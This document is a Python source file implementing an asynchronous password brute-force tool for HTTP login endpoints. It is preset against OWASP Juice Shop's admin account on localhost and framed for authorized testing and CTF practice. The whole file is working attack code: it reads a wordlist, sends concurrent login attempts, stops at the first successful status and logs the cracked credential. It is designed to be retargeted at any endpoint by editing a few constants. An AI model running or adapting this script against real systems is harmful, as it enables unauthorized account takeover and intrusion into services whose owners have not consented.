"""Async brute-force template for HTTP login-style endpoints.

Overview
--------
This module is a small, self-contained template for exercising weak-credential
discovery against a single HTTP endpoint. It is intended for authorized
security testing and CTF-style exercises (e.g. OWASP Juice Shop).

How it works
------------
1.  A wordlist file is read lazily, one candidate value per line.
2.  For every candidate, the value is substituted into a single configurable
    field (``INJECT_FIELD``) of a JSON payload (``BASE_PAYLOAD``).
3.  Requests are dispatched concurrently with ``httpx.AsyncClient``. A
    ``asyncio.Semaphore`` caps in-flight requests so the target is not
    saturated and the local event loop stays responsive.
4.  The first response whose status code equals ``SUCCESS_STATUS`` (default
    ``200``) trips an ``asyncio.Event``. All other in-flight and queued
    attempts observe the event and short-circuit, so the script terminates
    as soon as a hit is found.
5.  All progress is logged through ``loguru``: a colored stream sink on stdout
    plus a rotating debug log on disk (``bruteforce.log``).

Tuning
------
The configuration constants at the top of the file (``TARGET_URL``,
``BASE_PAYLOAD``, ``INJECT_FIELD``, ``CONCURRENCY``, ``REQUEST_TIMEOUT``,
``SUCCESS_STATUS``) are the only knobs you should normally need to adjust
when retargeting the template at a new endpoint.

Usage
-----
    uv run python admin_bruteforce.py --wordlist passwords.txt
"""

from __future__ import annotations

import argparse
import asyncio
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx
from loguru import logger

# --- Tweak per challenge -----------------------------------------------------

TARGET_URL: str = "http://localhost:3000/rest/user/login"
METHOD: str = "POST"

# Static payload. The field named in INJECT_FIELD is overwritten per attempt.
BASE_PAYLOAD: dict[str, Any] = {
    "email": "admin@juice-sh.op",
    "password": "",
}
INJECT_FIELD: str = "password"

HEADERS: dict[str, str] = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0",
}

CONCURRENCY: int = 10
REQUEST_TIMEOUT: float = 10.0
SUCCESS_STATUS: int = 200

# -----------------------------------------------------------------------------


async def attempt(
    client: httpx.AsyncClient,
    semaphore: asyncio.Semaphore,
    candidate: str,
    found: asyncio.Event,
) -> tuple[str, int] | None:
    """Send one HTTP request with ``candidate`` substituted into the payload.

    The function is concurrency-aware: it checks the shared ``found`` event
    both before acquiring the semaphore and again after acquiring it, so that
    queued coroutines abandon their work as soon as another coroutine reports
    a hit. This keeps the script's wind-down time bounded once a credential
    is discovered.

    Parameters
    ----------
    client:
        An already-open ``httpx.AsyncClient``. Reusing the client across all
        attempts allows the HTTP/1.1 keep-alive pool to amortize the TCP/TLS
        handshake cost.
    semaphore:
        Caps the number of simultaneously in-flight requests. Sized by
        ``CONCURRENCY``.
    candidate:
        The value to inject into ``BASE_PAYLOAD[INJECT_FIELD]`` for this
        single request.
    found:
        Shared cancellation flag. Set by the first coroutine that observes
        ``SUCCESS_STATUS``. Other coroutines treat it as a stop signal.

    Returns
    -------
    tuple[str, int] | None
        ``(candidate, status_code)`` when this attempt produced the success
        status, otherwise ``None`` (request failed, returned a non-success
        status, or was short-circuited by ``found``).
    """
    if found.is_set():
        return None

    payload: dict[str, Any] = {**BASE_PAYLOAD, INJECT_FIELD: candidate}

    async with semaphore:
        if found.is_set():
            return None
        try:
            response: httpx.Response = await client.request(
                METHOD, TARGET_URL, json=payload, headers=HEADERS
            )
        except httpx.HTTPError as exc:
            logger.warning("request failed for {!r}: {}", candidate, exc)
            return None

    logger.debug("tried {!r} -> {}", candidate, response.status_code)

    if response.status_code == SUCCESS_STATUS:
        found.set()
        logger.success(
            "HIT! {}={!r} (status {})", INJECT_FIELD, candidate, response.status_code
        )
        logger.info("response body: {}", response.text[:500])
        return candidate, response.status_code

    return None


def iter_wordlist(path: Path) -> Iterator[str]:
    """Yield non-empty lines from ``path`` lazily.

    The file is opened with ``errors="ignore"`` so binary noise or stray
    non-UTF-8 bytes commonly found in public wordlists do not abort the run.
    Trailing newline characters are stripped, but inner whitespace is kept
    intact in case the target system treats it as significant.

    Parameters
    ----------
    path:
        Path to a UTF-8 text file containing one candidate value per line.

    Yields
    ------
    str
        A single candidate string with ``\\r`` and ``\\n`` stripped. Blank
        lines are skipped.
    """
    with path.open("r", encoding="utf-8", errors="ignore") as handle:
        for raw in handle:
            line: str = raw.rstrip("\r\n")
            if line:
                yield line


async def run(wordlist: Path) -> str | None:
    """Drive the brute-force loop end-to-end and return the winning value.

    A single ``httpx.AsyncClient`` is created with connection pool limits
    matching ``CONCURRENCY`` so the pool is neither starved nor over-allocated.
    Every candidate becomes its own ``asyncio.Task`` so that the event loop
    can interleave requests aggressively. ``asyncio.as_completed`` is used to
    pull results in completion order; the first non-``None`` result triggers
    cancellation of the remaining tasks.

    Parameters
    ----------
    wordlist:
        Path to the wordlist file consumed by :func:`iter_wordlist`.

    Returns
    -------
    str | None
        The candidate that produced ``SUCCESS_STATUS``, or ``None`` when the
        wordlist was exhausted without a hit.
    """
    found: asyncio.Event = asyncio.Event()
    semaphore: asyncio.Semaphore = asyncio.Semaphore(CONCURRENCY)
    winner: str | None = None

    limits: httpx.Limits = httpx.Limits(
        max_connections=CONCURRENCY, max_keepalive_connections=CONCURRENCY
    )
    timeout: httpx.Timeout = httpx.Timeout(REQUEST_TIMEOUT)

    async with httpx.AsyncClient(limits=limits, timeout=timeout) as client:
        tasks: list[asyncio.Task[tuple[str, int] | None]] = []
        for candidate in iter_wordlist(wordlist):
            if found.is_set():
                break
            tasks.append(
                asyncio.create_task(attempt(client, semaphore, candidate, found))
            )

        for coro in asyncio.as_completed(tasks):
            result: tuple[str, int] | None = await coro
            if result is not None:
                winner = result[0]
                for task in tasks:
                    task.cancel()
                break

    return winner


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments.

    Returns
    -------
    argparse.Namespace
        Namespace with two attributes:

        * ``wordlist`` (``Path``): path to the candidate file.
        * ``log_level`` (``str``): loguru level name controlling the stdout
          sink verbosity. The file sink is always ``DEBUG`` so a full trace
          remains available post-run.
    """
    parser: argparse.ArgumentParser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--wordlist",
        type=Path,
        required=True,
        help="Path to wordlist file (one candidate per line)",
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        help="Loguru level: DEBUG, INFO, SUCCESS, WARNING, ERROR",
    )
    return parser.parse_args()


def main() -> None:
    """Program entrypoint: configure logging, run the loop, report outcome.

    Side effects:

    * Removes loguru's default handler and installs two sinks:

      - A colorized stdout sink at the user-selected level.
      - A rotating file sink ``bruteforce.log`` (5 MB rotation, 3 retained)
        that always captures DEBUG so failed attempts can be inspected
        after the fact.

    * Exits the process with status ``1`` when the wordlist is exhausted
      without producing a ``SUCCESS_STATUS`` response, otherwise returns
      normally after logging the winning credential.
    """
    args: argparse.Namespace = parse_args()

    logger.remove()
    logger.add(
        lambda m: print(m, end=""),
        level=args.log_level,
        colorize=True,
        format="<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | {message}",
    )
    logger.add("bruteforce.log", level="DEBUG", rotation="5 MB", retention=3)

    logger.info("target: {} {}", METHOD, TARGET_URL)
    logger.info("injecting field {!r} from {}", INJECT_FIELD, args.wordlist)

    winner: str | None = asyncio.run(run(args.wordlist))

    if winner is None:
        logger.error("wordlist exhausted, no 200 response")
        raise SystemExit(1)

    logger.success("credential found: {}={!r}", INJECT_FIELD, winner)


if __name__ == "__main__":
    main()
